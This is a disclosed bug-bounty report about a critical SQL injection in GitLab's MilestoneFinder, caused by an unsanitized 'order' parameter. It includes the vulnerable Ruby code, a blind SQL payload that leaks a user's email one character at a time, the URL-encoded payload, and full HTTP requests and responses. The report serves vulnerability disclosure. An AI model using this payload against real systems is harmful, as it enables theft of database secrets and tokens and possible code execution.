# SQL injection in MilestoneFinder order method

## Report Details
- **Report ID**: 298176
- **URL**: https://hackerone.com/reports/298176
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-12-15T03:15:38.095Z
- **Disclosed**: 2018-04-27T02:20:24.581Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the `Groups::MilestonesController`. When the **index** action is requested, the `milestones` method is called. Here's the first two lines of the method:

**app/controllers/groups/milestones_controller.rb**
```ruby
def milestones
    search_params = params.merge(group_ids: group.id)

    milestones = MilestonesFinder.new(search_params).execute
    # ...
```

This code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the `execute` method. Here's the method:

**app/finders/milestone_finder.rb**
```ruby
  def execute
    return Milestone.none if project_ids.empty? && group_ids.empty?

    items = Milestone.all
    items = by_groups_and_projects(items)
    items = by_title(items)
    items = by_state(items)

    order(items)
  end
```

The `order` call on the last line is implemented as following: 

**app/finders/milestone_finder.rb**
```ruby
 def order(items)
    if params.has_key?(:order)
      items.reorder(params[:order])
    else
      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')
      items.reorder(order_statement)
    end
  end
```

As can be seen on line 2 of the method, `reorder` is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here's a request example:

**Request**
```
GET /groups/my-test-group/-/milestones HTTP/1.1
Host: gitlab.com
Accept: application/json
...
```

**Response**
```json
[
  {
    "title": "3",
    "name": "3",
    "id": 429944
  },
  {
    "title": "4",
    "name": "4",
    "id": 429943
  }
]
```

Then, consider the following SQL injection payload:

```sql
(CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)
```

This payload does three things: it fetches the `email` column from the `users` table where the `username` matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the `email` (the `SUBSTR(<>, 1, 1)` call) and compares that to a `a`. If that's the case, it'll compare the `id` of the current milestone to `429944`. If that is true, it'll sort on column number 2. If that is **not** the case, it'll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character `a`.

To prepare the payload, replace `429944` in the payload with a milestone ID of your account and URL encode it:

**Encoded payload**
```
%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29
```

Now submit the first request:

**Request 1 (`a`)**
```
GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1
Host: gitlab.com
Accept: application/json
...
```

**Response 1**
```
HTTP/1.1 200 OK
Server: nginx
...

[{"title":"3","name":"3","id":429944},{"title":"4","name":"4","id":429943}]
```

In the response above the milestones are sorted **descending** based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter `j`, the following behavior is observer:

**Request 2 (`j`)**
```
GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1
Host: gitlab.com
Accept: application/json
...
```

**Response 2**
```
HTTP/1.1 200 OK
Server: nginx
...

[{"title":"4","name":"4","id":429943},{"title":"3","name":"3","id":429944}]
```

Because the first character of my email is actually `j`, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the `SUBSTR` function can be changed to guess characters on other positions of the value.

This has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).

## Impact

An attacker can extract all information from the a GitLab instance's database, including private access and shell tokens. These can be used to elevate the user's privileges, which may lead to arbitrary code execution.

## Attachments
No attachments
